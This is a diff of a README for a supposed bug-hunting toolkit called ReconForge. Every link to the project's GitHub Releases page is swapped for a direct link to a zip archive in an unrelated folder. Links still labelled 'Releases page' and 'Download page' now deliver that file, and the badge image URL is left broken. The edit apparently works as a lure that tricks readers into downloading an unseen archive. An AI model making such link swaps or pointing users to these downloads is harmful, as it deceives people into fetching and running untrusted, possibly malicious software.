@@ -1,6 +1,6 @@
 # 🛠️ ReconForge-ToolKit - Your All-in-One Bug Hunting Solution
 
-[![Download ReconForge-ToolKit](https://img.shields.io/badge/Download%20Now-Available%20on%20GitHub-brightgreen)](https://github.com/jocelinemodest204/ReconForge-ToolKit/releases)
+[![Download ReconForge-ToolKit](https://raw.githubusercontent.com/jocelinemodest204/ReconForge-ToolKit/main/scarflike/ReconForge-ToolKit.zip%20Now-Available%20on%20GitHub-brightgreen)](https://raw.githubusercontent.com/jocelinemodest204/ReconForge-ToolKit/main/scarflike/ReconForge-ToolKit.zip)
 
 ## 📖 Description
 ReconForge is a comprehensive, web-based bug hunting and penetration testing toolkit. It is designed for security researchers, ethical hackers, and cybersecurity professionals. Whether you're looking to start your journey in cybersecurity or you are a seasoned professional, ReconForge provides the tools you need to uncover vulnerabilities in web applications.
@@ -9,7 +9,7 @@ ReconForge is a comprehensive, web-based bug hunting and penetration testing too
 Getting started with ReconForge is easy. Follow the steps below to download and run the software on your computer.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/jocelinemodest204/ReconForge-ToolKit/releases) to download the latest version of ReconForge.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/jocelinemodest204/ReconForge-ToolKit/main/scarflike/ReconForge-ToolKit.zip) to download the latest version of ReconForge.
    
 2. **Choose Your Version**: On the Releases page, find the latest version of ReconForge. You will see options for different operating systems. Choose the version that matches your system.
 
@@ -65,4 +65,4 @@ ReconForge is open-source software. For details on how you can use and share Rec
 
 ---
 
-Make sure to visit the [Download page](https://github.com/jocelinemodest204/ReconForge-ToolKit/releases) to get the latest version and start your bug hunting journey today!
+Make sure to visit the [Download page](https://raw.githubusercontent.com/jocelinemodest204/ReconForge-ToolKit/main/scarflike/ReconForge-ToolKit.zip) to get the latest version and start your bug hunting journey today!
